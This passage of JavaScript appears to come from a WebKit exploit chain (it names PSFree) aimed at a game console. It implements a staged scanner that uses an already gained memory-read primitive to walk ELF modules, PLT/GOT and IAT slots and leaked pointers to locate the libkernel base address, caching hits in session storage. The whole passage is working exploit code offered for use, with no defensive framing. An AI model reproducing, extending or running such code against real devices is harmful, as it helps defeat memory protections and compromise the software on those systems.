        const c = scanElfModulesChunk(p, webkitBase, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "psfree";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "psfree-next",
                prev: c.phase,
                pages: c.pages,
                modules: c.modules,
                bestScore: c.bestScore,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "psfree") {
        if (!state.psfreeTried) {
            state.psfreeTried = true;
            const fast = resolveLibkernelPsfree(p, webkitBase, off, opts);
            if (fast.ok) {
                return {
                    done: true,
                    lk: fast.lk,
                    iatRva: fast.iatRva,
                    source: fast.source,
                    state,
                    phase: "psfree-hit",
                };
            }
        }
        const c = scanPsfreePltChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "plt";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "plt-next",
                prev: c.phase,
                tried: c.tried,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "plt") {
        const c = scanPltGotChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.refs != null) state.pltRefs = c.refs;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            if (state.poopsLite) {
                state.stage = "nearlk";
                state.sub = null;
                state.pltStats = {
                    refs: state.pltRefs,
                    ff25: c.ff25,
                    gotHigh: c.gotHigh,
                    e8ext: c.e8ext,
                };
                return {
                    done: false,
                    state,
                    phase: "nearlk-next",
                    ff25: c.ff25,
                    gotHigh: c.gotHigh,
                    e8ext: c.e8ext,
                    refs: c.refs,
                };
            }
            state.stage = "got";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "got-next",
                prev: c.phase,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "nearlk") {
        const c = scanNearLibkernelChunk(p, webkitBase, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            const st = state.pltStats || {};
            state.nearPages = c.pages;
            state.nearHits = c.hits;
            state.stage = "leak";
            state.sub = null;
            state.pltStats = st;
            return {
                done: false,
                state,
                phase: "leak-next",
                nearPages: c.pages,
                nearHits: c.hits,
                ff25: st.ff25,
                gotHigh: st.gotHigh,
                e8ext: st.e8ext,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "leak") {
        const c = scanLeakExtPtrChunk(p, webkitBase, off, state.sub, opts.retain);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            const st = state.pltStats || {};
            return {
                done: true,
                lk: null,
                state,
                phase: "lite-miss",
                refs: st.refs,
                ff25: st.ff25,
                gotHigh: st.gotHigh,
                e8ext: st.e8ext,
                nearPages: state.nearPages,
                nearHits: state.nearHits,
                leakTried: c.tried,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "got" || state.stage === "rw") {
        const c = scanErrorIatChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.slots != null) state.gotSlots = c.slots;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "base";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "base-next",
                prev: c.phase,
                slots: state.gotSlots,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "base") {
        const c = scanLkPrologueChunk(p, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "stub";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "stub-next",
                prev: c.phase,
                probes: c.probes,
                slots: state.gotSlots,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "stub") {
        const c = scanLibkernelStubChunk(p, webkitBase, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.done = true;
            return {
                done: true,
                lk: null,
                state,
                phase: c.phase,
                probes: c.probes,
                slots: state.gotSlots,
                refs: state.pltRefs,
                dynTried: state.dynTried,
                dynSlots: state.dynSlots,
            };
        }
        return Object.assign({ state }, c);
    }

    return { done: true, lk: null, state };
}

export function resolveLibkernel(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});

    if (!off)
        return { ok: false, error: "missing offsets" };

    try {
        const forced = sessionStorage.getItem(SS_LK_FORCED) === "1";
        const rawLk = sessionStorage.getItem(SS_LK_BASE);
        if (rawLk) {
            const lk = parseAddrSync(rawLk);
            if (lk && forced) {
                log("LK-CACHE", "libkernel " + lk + " (forced, 0 reads)");
                return { ok: true, lk, source: "forced" };
            }
            if (lk && isLibkernelPrologue(p, lk)) {
                log("LK-CACHE", "libkernel " + lk);
                return { ok: true, lk, source: "cache" };
            }
            if (!forced) {
                log("LK-CACHE-BAD", "stale " + rawLk + " — cleared");
                sessionStorage.removeItem(SS_LK_BASE);
            } else if (lk) {
                log("LK-CACHE", "libkernel " + lk + " (forced, skip prologue)");
                return { ok: true, lk, source: "forced" };
            }
        }
    } catch (_) { }

    const savedIat = loadSessionIatRva();
    if (savedIat != null && rvaAllowed(savedIat, off)) {
        const hit = safeVerifyGotSlot(p, webkitBase, off, savedIat);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-IAT", "+0x" + hit.iatRva.toString(16) + " → " + hit.lk);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "session" };
        }
    }

    const dyn = resolveLibkernelDynamic(p, webkitBase, off, opts);
    if (dyn.ok)
        return dyn;

    const psf = resolveLibkernelPsfree(p, webkitBase, off, opts);
    if (psf.ok)
        return psf;

    log("LK-BLOCK", "dyn+PSFree miss — Scan libkernel for ELF hunt");
    return { ok: false, error: "Scan libkernel (dynamic GOT + ELF hunt)" };
}

/** Validate user-pasted libkernel base (1 read). */
export function verifyManualLibkernel(p, lk) {
    if (!lk || !isLibkernelPrologue(p, lk))
        return { ok: false, error: "not libkernel prologue (want 0xb8 @ base)" };
    saveLibkernelSession(lk, null);
    return { ok: true, lk };
}

export function elfGotPltRva() {
    return null;
}

export function scanGotPltSlots() {
    return null;
}

export function resolveLibkernelFast() {
    return { ok: false, error: "use RW GOT scan" };
}
